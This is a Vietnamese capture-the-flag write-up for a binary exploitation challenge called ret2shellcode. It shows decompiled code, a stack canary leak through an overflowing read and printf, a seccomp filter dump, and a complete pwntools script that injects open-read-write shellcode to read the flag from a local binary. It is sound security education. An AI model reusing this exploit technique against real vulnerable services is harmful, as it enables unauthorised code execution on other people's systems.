---
title: "Pwn3-MiniCTF-PTITHCM"
date: 2024-01-05 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2shellcode, canary-leak, stack-overflow, ptithcm]
author: datious
---
# Pwn3-MiniCTF-PTITHCM
*Author: D1n0_09-N24DCAT015*

* Đầu tiên server sẽ cho ta 1 file có tên ret2shellcode => Dự đoán khai thác bằng cách overwrite save rip để return vào shellcode.
1. Tổng quát về file thực thi.
* Đầu tiên em dùng ghidra để decompile file bin thành source code có thể đọc được.
```

void main(void)

{
  long in_FS_OFFSET;
  undefined1 local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("%p",local_118);
  printf("\nWelcome to our CTF");
  printf("\nTo play our CTF, please register an account:");
  printf("\nPlease enter your username: ");
  fflush(stdout);
  hehe();
  read(0,local_118,0x10a);
  printf("Your user name: %s",local_118);
  printf("\nEnter your password: ");
  memset(local_118,0,0x100);
  fflush(stdout);
  read(0,local_118,0x120);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```
=> Đây là code của hàm main. 
* Ta có thể thấy lỗi buffer overflow ở cả 2 hàm read()
* Check thử các lớp bảo mật.
![image](https://hackmd.io/_uploads/rkdXmZQebg.png)
=> Canary bật vậy không thể trực tiếp overwrite save rip được. Nhưng ở hàm main còn 1 lỗi nữa đó chính là hàm printf() ở hàm này nó sẽ đọc dữ liệu trên cho tới khi gặp null byte mà canary có byte đầu tiên là null byte.
=> Hướng khai thác sẽ leak canary để vượt mặt lớp bảo vệ này.
2. Khai thác
*Lần nhập đầu tiên chương trình cho nhập 266 bytes mà biến này giới hạn chỉ 264 bytes nên ta thử nhập payload có độ lớn 266 bytes.
![image](https://hackmd.io/_uploads/BJAoN-7ebg.png)
  Canary nằm phía trên save rbp ta có thể thấy nó đã ghi đè 2 bytes của canary => Vậy ta cần nhập payload đầu có độ lớn là 265 bytes => leak được canary mà vẫn đảm bảo khôi phục lại sau leak.
* Vậy đã có được canary.
* Bước tiếp theo là shellcode: để thực hiện ta cần shellcode và địa chỉ để nhảy đúng vào nó.
* Khi chạy chuong trình ta thấy nó cung cấp cho ta 1 địa chỉ:
![image](https://hackmd.io/_uploads/SJJZ8bXxWx.png)
* Đã đầy đủ nguyên liệu để bypass và lấy được quyền điều khiển.
! Nhưng sau khi chạy script lại không thể thực thi shellcode. Chương trình đã kill ngay sau khi return vào shellcode => check lại quyền gọi syscall thì em thấy: 
```
┌──(pwnenv)─(kali㉿kali)-[~/Downloads/mini]
└─$ sudo seccomp-tools dump ./ret2shellcode 
[sudo] password for kali: 
0x7ffffbb6b2d0
Welcome to our CTF
To play our CTF, please register an account:
Please enter your username:  line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0b 0xffffffff  if (A != 0xffffffff) goto 0016
 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000001  if (A == write) goto 0015
 0007: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0015
 0008: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0015
 0009: 0x15 0x05 0x00 0x00000005  if (A == fstat) goto 0015
 0010: 0x15 0x04 0x00 0x00000008  if (A == lseek) goto 0015
 0011: 0x15 0x03 0x00 0x00000010  if (A == ioctl) goto 0015
 0012: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0015
 0013: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0015
 0014: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL

```
* Ở đây ta thấy các quyền gọi cho phép là open, read, write => Thay đổi shellcode để dùng các lệnh này nhằm đọc flag luôn.
* Lần nhập thứ 2: 
 - Ở phần đầu của chuong trình đã có địa chỉ và sau khi debug tôi biết được nó là địa chỉ của buffer lần nhập thứ 2.
 => Payload=shellcode+padding+canary_leak+save_rbp+leak_address
 => offset =264 bytes để tới được canary.
 3. Viết script
 
 

```
#!/usr/bin/python3
from pwn import *

exe=ELF('./ret2shellcode',checksec=False)
p=process(exe.path)
#leak canary
context.arch='amd64'
context.os='linux'
input()
gdb.attach(p,gdbscript='''
 
''')

info=int(p.recvline(),16)
log.info("info for jump: "+hex(info))

shellcode=asm('''
xor rax,rax 
push rax
mov rax,8392585648256674918
push rax 
mov rax,0x2
mov rdi,rsp
mov rsi,0 
mov rdx,0
syscall
mov rdi,rax
mov rax,0
lea rsi,[rsp-0x200]
mov rdx,0x200
syscall
mov rdx,rax
lea rsi,[rsp-0x200]
mov rdi,1
mov rax,1
syscall   
mov rax,60
mov rdi,0
''')

payload1=b'A'*265
p.sendafter(b'username: ',payload1)
p.recvuntil(b'A'*265)
leak=u64(b'\0'+p.recv(7))
log.info("leak canary: "+hex(leak))


payload=shellcode
payload=payload.ljust(264)
payload+=p64(leak)
payload+=p64(0)

payload+=p64(info)
p.sendafter(b'password: ',payload)

p.interactive()
```
=> Done! 
![image](https://hackmd.io/_uploads/rkj_1f7eZe.png)
* Cái này em chạy local nên flag em tự tạo luôn.